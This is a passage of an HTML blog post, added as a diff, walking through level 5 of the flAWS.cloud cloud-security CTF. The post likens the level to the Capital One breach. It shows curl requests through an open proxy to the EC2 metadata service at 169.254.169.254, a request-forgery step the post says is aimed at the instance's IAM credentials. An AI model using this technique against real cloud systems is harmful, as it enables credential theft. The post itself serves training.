@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.56.3" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>flaws.cloud - Level 5 | text/plain</title>
+    <meta name="description" content="In this article I look at level 5 of flAWS.cloud, a
+CTF-style cloud security game in teaching you basics of cloud security by
+making you break into an AWS account. This level is a particularly interesting
+one because it is remarkably similar to a high-profile hack that was big in the
+news lately. CapitalOne [lost &gt;100M customer records](https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/),
+stolen from their S3 buckets. Presumably the attacker extracted credentials
+from a misconfigured web application firewall (WAF) and then simply downloaded the
+material. This is exactly what we will do in this level too.
+">
+    <meta name="keywords" content="infosec, cloud, AWS">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="flaws.cloud - Level 5" />
+<meta property="og:description" content="In this article I look at level 5 of flAWS.cloud, a
+CTF-style cloud security game in teaching you basics of cloud security by
+making you break into an AWS account. This level is a particularly interesting
+one because it is remarkably similar to a high-profile hack that was big in the
+news lately. CapitalOne [lost &gt;100M customer records](https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/),
+stolen from their S3 buckets. Presumably the attacker extracted credentials
+from a misconfigured web application firewall (WAF) and then simply downloaded the
+material. This is exactly what we will do in this level too.
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/flaws_cloud_5/" />
+
+<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322" />
+<meta property="article:published_time" content="2019-11-28T00:00:00+01:00" />
+<meta property="article:modified_time" content="2019-11-28T00:00:00+01:00" />
+
+    
+
+
+
+  <meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/flaws_cloud_5/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+</style>
+
+    
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="active" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    <meta itemprop="name" content="flaws.cloud - Level 5">
+<meta itemprop="description" content="In this article I look at level 5 of flAWS.cloud, a
+CTF-style cloud security game in teaching you basics of cloud security by
+making you break into an AWS account. This level is a particularly interesting
+one because it is remarkably similar to a high-profile hack that was big in the
+news lately. CapitalOne [lost &gt;100M customer records](https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/),
+stolen from their S3 buckets. Presumably the attacker extracted credentials
+from a misconfigured web application firewall (WAF) and then simply downloaded the
+material. This is exactly what we will do in this level too.
+">
+
+
+<meta itemprop="datePublished" content="2019-11-28T00:00:00&#43;01:00" />
+<meta itemprop="dateModified" content="2019-11-28T00:00:00&#43;01:00" />
+<meta itemprop="wordCount" content="2810">
+
+
+
+<meta itemprop="keywords" content="infosec,cloud,AWS," />
+
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">flaws.cloud - Level 5</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>14 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2019-11-28T00:00:00&#43;01:00">28 Nov, 2019</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">In this article I look at level 5 of flAWS.cloud, a
+CTF-style cloud security game in teaching you basics of cloud security by
+making you break into an AWS account. This level is a particularly interesting
+one because it is remarkably similar to a high-profile hack that was big in the
+news lately. CapitalOne [lost &gt;100M customer records](https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/),
+stolen from their S3 buckets. Presumably the attacker extracted credentials
+from a misconfigured web application firewall (WAF) and then simply downloaded the
+material. This is exactly what we will do in this level too.
+</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#level-5">Level 5</a>
+<ul>
+<li><a href="#exploring-the-proxy">Exploring the proxy</a></li>
+<li><a href="#accessing-instance-metadata">Accessing Instance Metadata</a></li>
+<li><a href="#using-the-credentials">Using the credentials</a></li>
+</ul></li>
+<li><a href="#the-flaw">The flaw</a>
+<ul>
+<li><a href="#prevent-misconfigurations-and-ssrf">Prevent misconfigurations and SSRF</a></li>
+<li><a href="#imdsv2">IMDSv2</a></li>
+<li><a href="#least-privilege">Least privilege</a></li>
+<li><a href="#iam-ip-constrains">IAM IP constrains</a></li>
+<li><a href="#detection-and-alerting">Detection and alerting</a>
+<ul>
+<li><a href="#guardduty">GuardDuty</a></li>
+<li><a href="#cloudtrail">CloudTrail</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      
+
+<p>OK, this is not exactly what we will do. This game focuses on cloud security
+only and is kept simple. There won&rsquo;t be complex applications protected by WAFs,
+just a simple proxy on an EC2 instance serving all the websites you
+request. From there, the goal is to find out how to make it serve the private
+IAM credentials that have been configured for this machine. Once you have them,
+all that is left is to use them to impersonate the EC2 instance and exfiltrate
+some data.</p>
+
+<p>Still, it is very similar to what people believe happened in the CapitalOne hack.
+Check <a href="https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/">krebsonsecurity.com</a>
+for what is known about it, or this <a href="https://www.justice.gov/usao-wdwa/press-release/file/1188626/download">indictment</a>
+for the official version.
+The gist is that CapitalOne supposedly operated a
+well-known open source WAF called <a href="https://modsecurity.org/">ModSecurity</a> and
+accidentally configured it to grant access to the so-called
+<a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">EC2 instance metadata service</a>.
+It provides IAM credentials to whoever has network access to it. These credentials
+allowed downloading the stolen data.</p>
+
+<p>That is all. Let&rsquo;s get going and see how all of this works.</p>
+
+<h1 id="level-5">Level 5</h1>
+
+<p>The level starts <a href="http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/">here</a>
+From the description we know that this link points to a proxy service
+operated on an EC2 instance. We can ask it to fetch any website for us by
+appending the URL to the &ldquo;proxy&rdquo; endpoint and terminating with a &ldquo;/&rdquo;.</p>
+
+<p>Our goal is to get access to a <a href="http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/">bucket</a>
+with a hidden directory. Most likely we have to find some credentials with
+permissions to access to it.</p>
+
+<h2 id="exploring-the-proxy">Exploring the proxy</h2>
+
+<p>That was just the description. Let&rsquo;s test the proxy to see if it works as
+promised. To do so, fetch the (HTTP) homepage of Google both directly and via the
+proxy. Here is the direct request (I show only a few headers):</p>
+
+<pre><code> # curl -i http://google.com
+HTTP/1.1 301 Moved Permanently
+Location: http://www.google.com/
+Server: gws
+...
+</code></pre>
+
+<p>We receive a 301 redirecting to the HTTPS-version of the site.
+The server header is &ldquo;gws&rdquo;, which is the name Google&rsquo;s proprietary web server
+uses (<a href="https://en.wikipedia.org/wiki/Google_Web_Server">Google Web Server</a>).
+Now request the site via the proxy:</p>
+
+<pre><code> # curl -i http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/google.com/
+HTTP/1.1 301 Moved Permanently
+Location: http://www.google.com/
+Server: nginx/1.10.0 (Ubuntu)
+...
+</code></pre>
+
+<p>This is mostly the same result but the server now is nginx 1.10.0.
+This time the EC2 instance made the request to Google and forwarded the result
+to us.</p>
+
+<p>Using <a href="https://icanhazip.com">icanhazip.com</a>, a web site that simply returns
+your IP address to you, we can further confirm this. Compare these two requests:</p>
+
+<pre><code> # curl icanhazip.com
+132.83.234.10
+ #
+ # curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/icanhazip.com/
+35.165.182.7
+</code></pre>
+
+<p>The direct request returns your public IP address whereas the proxied request
+returns the public IP address of the proxy, which is <code>35.165.182.7</code>.
+You can verify this proxy IP address with &ldquo;dig&rdquo;:</p>
+
+<pre><code> # dig 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud @9.9.9.9
+...
+;; ANSWER SECTION:
+4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. 300 IN CNAME ec2-35-165-182-7.us-west-2.compute.amazonaws.com.
+ec2-35-165-182-7.us-west-2.compute.amazonaws.com. 43200 IN A 35.165.182.7
+</code></pre>
+
+<p>Thus we now know for sure we can use this EC2 instance to make requests on our
+behalf and we control the host name.
+To the site we request, it will be as if the EC2 instance does the request.
+What can we do with that?</p>
+
+<h2 id="accessing-instance-metadata">Accessing Instance Metadata</h2>
+
+<p>EC2 instances on AWS have access to a so-called <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">metadata service</a>.
+The service is made available on a link-local IPv4 address (<a href="https://tools.ietf.org/html/rfc3927">see RFC 3927</a>)
+at <code>169.254.169.254</code>. Accordingly it is only available from the EC2 instance
+itself and can never be requested from any other host.</p>
+
+<p>Did the creator of the proxy block access to link-local IPv4 addresses?
+We should find this out. Go to <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254</a>
+and what you get is this:</p>
+
+<pre><code> # curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/
+1.0
+2007-01-19
+...
+2018-09-24
+latest
+</code></pre>
+
+<p>This looks like the entry page for the metadata service. We have access!</p>
+
+<p>The metadata service exposes plenty of configuration data about the instance.
+Start at <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest">169.254.169.254/latest</a>
+and follow the (non-clickable) links to explore.
+For example, at <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/dynamic/instance-identity/document/">169.254.169.254/latest/dynamic/instance-identity/document/</a>
+you will find the following high-level summary of the configuration:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-json" data-lang="json"><span></span><span style="color: #f8f8f2">{</span>
+  <span style="color: #f92672">&quot;privateIp&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;172.31.41.84&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;devpayProductCodes&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #66d9ef">null</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;marketplaceProductCodes&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #66d9ef">null</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;version&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;2017-09-30&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;instanceId&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;i-05bef8a081f307783&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;billingProducts&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #66d9ef">null</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;instanceType&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;t2.micro&quot;</span><span style="color: #f8f8f2">,</span>
+  <span style="color: #f92672">&quot;availabilityZone&quot;</span> <span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;us-west-2a&quot;</span><span style="color: #f8f8f2">,</span>
